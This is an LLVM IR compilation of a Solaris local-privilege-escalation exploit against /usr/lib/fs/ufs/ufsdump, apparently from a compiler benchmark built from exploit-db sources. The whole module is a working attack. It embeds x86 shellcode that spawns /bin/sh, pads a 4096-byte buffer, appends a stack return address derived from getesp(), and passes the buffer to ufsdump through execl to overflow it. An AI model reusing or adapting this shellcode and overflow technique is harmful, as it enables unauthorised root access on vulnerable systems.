; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19533.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_19533.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shellcode = private unnamed_addr constant [101 x i8] c"U\8B\EC\83\EC\08\EBP3\C0\B0;\EB\16\C33\C0@\EB\10\C3^3\DB\89^\01\C6F\05\07\88~\06\EB\05\E8\EC\FF\FF\FF\9A\FF\FF\FF\FF\0F\0F\C3^3\C0\89v\08\88F\07\89F\0CP\8DF\08P\8BF\08P\E8\BD\FF\FF\FF\83\C4\0Cj\01\E8\BA\FF\FF\FF\83\C4\04\E8\D4\FF\FF\FF/bin/sh\00", align 16
@.str = private unnamed_addr constant [15 x i8] c"Offset: 0x%x\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [24 x i8] c"/usr/lib/fs/ufs/ufsdump\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"ufsdump\00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"1\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca [4096 x i8], align 16
  %12 = alloca [101 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = bitcast [101 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([101 x i8], [101 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 101, i1 false)
  store i32 895, i32* %8, align 4
  store i32 3500, i32* %9, align 4
  %14 = load i32, i32* %4, align 4
  %15 = icmp sgt i32 %14, 1
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @atoi(i8* %19)
  store i32 %20, i32* %8, align 4
  br label %21

21:                                               ; preds = %16, %2
  %22 = load i32, i32* %4, align 4
  %23 = icmp sgt i32 %22, 2
  br i1 %23, label %24, label %29

24:                                               ; preds = %21
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 2
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @atoi(i8* %27)
  store i32 %28, i32* %9, align 4
  br label %29

29:                                               ; preds = %24, %21
  store i32 0, i32* %6, align 4
  br label %30

30:                                               ; preds = %38, %29
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %8, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %41

34:                                               ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

38:                                               ; preds = %34
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %6, align 4
  br label %30

41:                                               ; preds = %30
  store i32 0, i32* %7, align 4
  %42 = load i32, i32* %8, align 4
  store i32 %42, i32* %6, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %6, align 4
  %45 = load i32, i32* %8, align 4
  %46 = getelementptr inbounds [101 x i8], [101 x i8]* %12, i64 0, i64 0
  %47 = call i32 @strlen(i8* %46)
  %48 = add nsw i32 %45, %47
  %49 = icmp slt i32 %44, %48
  br i1 %49, label %50, label %62

50:                                               ; preds = %43
  %51 = load i32, i32* %7, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %7, align 4
  %53 = sext i32 %51 to i64
  %54 = getelementptr inbounds [101 x i8], [101 x i8]* %12, i64 0, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %57
  store i8 %55, i8* %58, align 1
  br label %59

59:                                               ; preds = %50
  %60 = load i32, i32* %6, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %6, align 4
  br label %43

62:                                               ; preds = %43
  %63 = call i32 (...) @getesp()
  %64 = load i32, i32* %9, align 4
  %65 = add nsw i32 %63, %64
  %66 = sext i32 %65 to i64
  store i64 %66, i64* %10, align 8
  %67 = load i64, i64* %10, align 8
  %68 = and i64 %67, 255
  %69 = trunc i64 %68 to i8
  %70 = load i32, i32* %6, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %71
  store i8 %69, i8* %72, align 1
  %73 = load i64, i64* %10, align 8
  %74 = lshr i64 %73, 8
  %75 = and i64 %74, 255
  %76 = trunc i64 %75 to i8
  %77 = load i32, i32* %6, align 4
  %78 = add nsw i32 %77, 1
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %79
  store i8 %76, i8* %80, align 1
  %81 = load i64, i64* %10, align 8
  %82 = lshr i64 %81, 16
  %83 = and i64 %82, 255
  %84 = trunc i64 %83 to i8
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 2
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %87
  store i8 %84, i8* %88, align 1
  %89 = load i64, i64* %10, align 8
  %90 = lshr i64 %89, 24
  %91 = and i64 %90, 255
  %92 = trunc i64 %91 to i8
  %93 = load i32, i32* %6, align 4
  %94 = add nsw i32 %93, 3
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %95
  store i8 %92, i8* %96, align 1
  %97 = load i64, i64* %10, align 8
  %98 = and i64 %97, 255
  %99 = trunc i64 %98 to i8
  %100 = load i32, i32* %6, align 4
  %101 = add nsw i32 %100, 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %102
  store i8 %99, i8* %103, align 1
  %104 = load i64, i64* %10, align 8
  %105 = lshr i64 %104, 8
  %106 = and i64 %105, 255
  %107 = trunc i64 %106 to i8
  %108 = load i32, i32* %6, align 4
  %109 = add nsw i32 %108, 5
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %110
  store i8 %107, i8* %111, align 1
  %112 = load i64, i64* %10, align 8
  %113 = lshr i64 %112, 16
  %114 = and i64 %113, 255
  %115 = trunc i64 %114 to i8
  %116 = load i32, i32* %6, align 4
  %117 = add nsw i32 %116, 6
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %118
  store i8 %115, i8* %119, align 1
  %120 = load i64, i64* %10, align 8
  %121 = lshr i64 %120, 24
  %122 = and i64 %121, 255
  %123 = trunc i64 %122 to i8
  %124 = load i32, i32* %6, align 4
  %125 = add nsw i32 %124, 7
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 %126
  store i8 %123, i8* %127, align 1
  %128 = load i64, i64* %10, align 8
  %129 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i64 %128)
  %130 = getelementptr inbounds [4096 x i8], [4096 x i8]* %11, i64 0, i64 0
  %131 = call i32 @execl(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i8* %130, i32* null)
  %132 = load i32, i32* %3, align 4
  ret i32 %132
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @getesp(...) #2

declare dso_local i32 @printf(i8*, i64) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
